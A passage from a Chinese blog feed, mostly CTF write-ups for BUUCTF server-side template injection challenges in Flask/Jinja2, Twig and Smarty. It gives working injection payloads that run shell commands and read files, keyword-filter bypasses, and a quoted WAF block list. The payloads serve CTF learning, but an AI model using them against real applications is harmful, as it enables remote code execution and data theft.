alt="image-20220309164202884"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164216276.png" alt="image-20220309164216276"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309170755365.png" alt="image-20220309170755365"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171250634.png" alt="image-20220309171250634"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171452021.png" alt="image-20220309171452021"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171750029.png" alt="image-20220309171750029"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172440403.png" alt="image-20220309172440403"></p><h2 id="正则表达式入门"><a href="#正则表达式入门" class="headerlink" title="正则表达式入门"></a>正则表达式入门</h2><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172719330.png" alt="image-20220309172719330"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172932180.png" alt="image-20220309172932180"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309173155868.png" alt="image-20220309173155868"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310221059335.png" alt="image-20220310221059335"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222034558.png" alt="image-20220310222034558"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222048846.png" alt="image-20220310222048846"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222156870.png" alt="image-20220310222156870"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222253774.png" alt="image-20220310222253774"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222536062.png" alt="image-20220310222536062"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222947293.png" alt="image-20220310222947293"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223442895.png" alt="image-20220310223442895"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223457982.png" alt="image-20220310223457982"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223913660.png" alt="image-20220310223913660"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310224006972.png" alt="image-20220310224006972"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310224106984.png" alt="image-20220310224106984"></p><h1 id="文本三剑客之SED"><a href="#文本三剑客之SED" class="headerlink" title="文本三剑客之SED"></a>文本三剑客之SED</h1><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130438065.png" alt="image-20220312130438065"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130454053.png" alt="image-20220312130454053"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130622253.png" alt="image-20220312130622253"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130857679.png" alt="image-20220312130857679"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312131800126.png" alt="image-20220312131800126"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312133718235.png" alt="image-20220312133718235"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312133753073.png" alt="image-20220312133753073"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312134452403.png" alt="image-20220312134452403"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312134809587.png" alt="image-20220312134809587"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312135021450.png" alt="image-20220312135021450"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312135508073.png" alt="image-20220312135508073"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312140156678.png" alt="image-20220312140156678"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312142630097.png" alt="image-20220312142630097"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144358895.png" alt="image-20220312144358895"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144428998.png" alt="image-20220312144428998"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144844748.png" alt="image-20220312144844748"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144908004.png" alt="image-20220312144908004"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312150114829.png" alt="image-20220312150114829"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312150551903.png" alt="image-20220312150551903"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151045339.png" alt="image-20220312151045339"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151057114.png" alt="image-20220312151057114"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151618086.png" alt="image-20220312151618086"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152110539.png" alt="image-20220312152110539"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152259202.png" alt="image-20220312152259202"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152359688.png" alt="image-20220312152359688"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152440203.png" alt="image-20220312152440203"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152528896.png" alt="image-20220312152528896"></p><p><strong>小tips</strong></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152552359.png" alt="image-20220312152552359"></p><p><strong>打印匹配字符串的下一行</strong></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152731016.png" alt="image-20220312152731016"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152914192.png" alt="image-20220312152914192"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-模板注入专项刷题</title>
      <link href="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/"/>
      <url>/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><ul><li>  <del>[CSCCTF 2019 Qual]FlaskLight</del></li></ul><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><ul><li>  <del>[BJDCTF2020]Cookie is so stable twig模板注入</del></li><li>  <del>[WesternCTF2018]shrine 想方设法获取config</del></li><li>  <del>[CISCN2019 华东南赛区]Web11 smarty模板注入</del></li><li>  <del>[BJDCTF2020]The mystery of ip</del></li><li>  <del>[GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点</del></li><li>  <del>[pasecactf_2019]flask_ssti 编码绕过</del></li><li>  <del>[GWCTF 2019]你的名字</del></li><li>  <del>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</del></li></ul><h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><ul><li>  <del>[护网杯 2018]easy_tornado 因为框架比较冷门，如果不看WP的话需要自己手动翻手册，我觉得算中上偏难的题目。</del></li><li>  <del>[CISCN2019 华东南赛区]Double Secret 国赛半决赛因为大家互相出题所以都互相恶心，这题整个MD4，线下环境怎么打？</del></li></ul><h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><ul><li>  [QWB2021 Quals]托纳多</li></ul><h3 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞"></a>脑洞</h3><ul><li>  <del>[RootersCTF2019]I_&lt;3_Flask 用name注入。？怎么想到的</del></li></ul><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160349289.png" alt="image-20220220160349289"></p><p>发现提示</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160501360.png" alt="image-20220220160501360"></p><p>测试成功</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160529875.png" alt="image-20220220160529875"></p><p>列出所有子类</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160904114.png" alt="image-20220220160904114"></p><p>放入find.py跑一下敏感函数</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220161148184.png" alt="image-20220220161148184"></p><p>构造payload</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>出现未知错误</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220162228623.png" alt="image-20220220162228623"></p><p>这里应该是关键字过滤</p><p>那就绕它！</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220170734065.png" alt="image-20220220170734065"></p><p>同理可构造payload</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;</code></pre><p>读取flag</p><pre><code class="python">http://91ff8d9a-4ad0-491a-8d5d-c55157088e4f.node4.buuoj.cn:81/?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek ').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220171038110.png" alt="image-20220220171038110"></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220191434667.png" alt="image-20220220191434667"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193930268.png" alt="image-20220220193930268"></p><p>存在模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193953376.png" alt="image-20220220193953376"></p><p>判断为twig注入</p><p>payload</p><pre><code class="php">&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code></pre><p>写入输入框没有效果</p><p>hint页面有提示</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194318325.png" alt="image-20220220194318325"></p><p>抓包分析</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194407436.png" alt="image-20220220194407436"></p><p>发现cookie中有user接受我们输入的值，猜测这个模板注入参数在cookie中</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194639959.png" alt="image-20220220194639959"></p><p>成功获得flag</p><h3 id="WesternCTF2018-shrine-想方设法获取config"><a href="#WesternCTF2018-shrine-想方设法获取config" class="headerlink" title="[WesternCTF2018]shrine 想方设法获取config"></a>[WesternCTF2018]shrine 想方设法获取config</h3><p>进去源码如下</p><pre><code class="python">import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>第一个路由是显示源码的，第二个路由可以传入参数，而且有黑名单过滤，猜测要读取配置文件</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220214030161.png" alt="image-20220220214030161"></p><p>测试一下存在模板注入</p><p>要利用模板注入来读取配置，config和self被过滤，但我们仍然可以利用url_for()和get_flashed_messages()函数来读取config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215728961.png" alt="image-20220220215728961"></p><p>发现</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215825765.png" alt="image-20220220215825765"></p><p>current_app意思应该是当前app，那我们就当前app下的config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215947455.png" alt="image-20220220215947455"></p><p>flag出来了</p><p>最终payload</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG'])&#125;&#125;</code></pre><p>同理</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h3 id="CISCN2019-华东南赛区-Web11-smarty模板注入"><a href="#CISCN2019-华东南赛区-Web11-smarty模板注入" class="headerlink" title="[CISCN2019 华东南赛区]Web11 smarty模板注入"></a>[CISCN2019 华东南赛区]Web11 smarty模板注入</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132600497.png" alt="image-20220221132600497"></p><p>敏感点X-Forwarded-For</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132701696.png" alt="image-20220221132701696"></p><p>会随X-Forwarded-For的变化而变化</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133442199.png" alt="image-20220221133442199"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133450679.png" alt="image-20220221133450679"></p><p>存在模板注入</p><pre><code>X-Forwarded-For: &#123;$smarty.version&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133545104.png" alt="image-20220221133545104"></p><p>判断该模板为smart，版本号为3.1.30</p><h4 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a><code>&#123;if&#125;</code>标签</h4><p>官方文档中的描述：</p><ul><li>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性</li><li>每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;</code> 和 <code>&#123;elseif&#125;</code></li><li>全部的PHP条件表达式和函数都可以在if内使用，如<code>||</code>, <code>or</code>, <code>&amp;&amp;</code>, <code>and,</code> <code>is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></li></ul><p>payload</p><pre><code class="python">&#123;if phpinfo()&#125;&#123;/if&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133721417.png" alt="image-20220221133721417"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133820171.png" alt="image-20220221133820171"></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134457254.png" alt="image-20220221134457254"></p><p>和上道题很相似,测试一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134530290.png" alt="image-20220221134530290"></p><p>模板注入有了</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134855416.png" alt="image-20220221134855416"></p><p>还是smart模板</p><p>和上道题一模一样，直接拿下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221135006801.png" alt="image-20220221135006801"></p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141908719.png" alt="image-20220221141908719"></p><p>hint:失败的意思就是，要让程序运行报错,报错后会暴露源码。</p><p>base64decode在不会解析的时候就会报错。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141936523.png" alt="image-20220221141936523"></p><p>拿到源码</p><pre><code class="python">@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )</code></pre><p>应该存在模板注入，测试一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142421065.png" alt="image-20220221142421065"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142406088.png" alt="image-20220221142406088"></p><p>模板注入有了</p><p>上payload</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142900538.png" alt="image-20220221142900538"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142907823.png" alt="image-20220221142907823"></p><p>被这里的waf过滤了</p><p>读取下app.py</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64 app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = &#39;s_e_c_r_e_t_k_e_y&#39;bootstrap = Bootstrap(app) class NameForm(FlaskForm):    text = StringField(&#39;BASE64加密&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;提交&#39;)class NameForm1(FlaskForm):    text = StringField(&#39;BASE64解密&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;提交&#39;) def waf(str):    black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,                  &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]    for x in black_list :        if x in str.lower() :            return 1  @app.route(&#39;/hint&#39;,methods=[&#39;GET&#39;])def hint():    txt = &quot;失败乃成功之母！！&quot;    return render_template(&quot;hint.html&quot;,txt = txt)  @app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def encode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64encode(text.encode())        tmp = &quot;结果  :&#123;0&#125;&quot;.format(str(text_decode.decode()))        res =  render_template_string(tmp)        flash(tmp)        return redirect(url_for(&#39;encode&#39;))     else :        text = &quot;&quot;        form = NameForm(text)        return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;) @app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )        return redirect(url_for(&#39;decode&#39;))     else :        text = &quot;&quot;        form = NameForm1(text)        return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)  @app.route(&#39;/&lt;name&gt;&#39;,methods=[&#39;GET&#39;])def not_found(name):    return render_template(&quot;404.html&quot;,name = name) if __name__ == &#39;__main__&#39;:    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</code></pre><pre><code class="python"> def waf(str): black_list = [&quot;flag&quot;, &quot;os&quot;,        &quot;system&quot;, &quot;popen&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;chr&quot;, &quot;request&quot;,        &quot;subprocess&quot;, &quot;commands&quot;, &quot;socket&quot;, &quot;hex&quot;, &quot;base64&quot;, &quot;*&quot;, &quot;?&quot;]</code></pre><p>我们发现waf过滤了这些关键词，我们要进行绕过</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152148066.png" alt="image-20220221152148066"></p><p>读取下flag</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_f'+'lag.txt', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152432736.png" alt="image-20220221152432736"></p><p>读取使用切片省去了拼接flag的步骤</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==‘catch_warnings‘ %&#125;&#123;&#123; c.__init__.__globals__[‘__builtins__‘].open(‘txt.galf_eht_si_siht/‘[::-1],‘r‘).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h3 id="pasecactf-2019-flask-ssti-编码绕过"><a 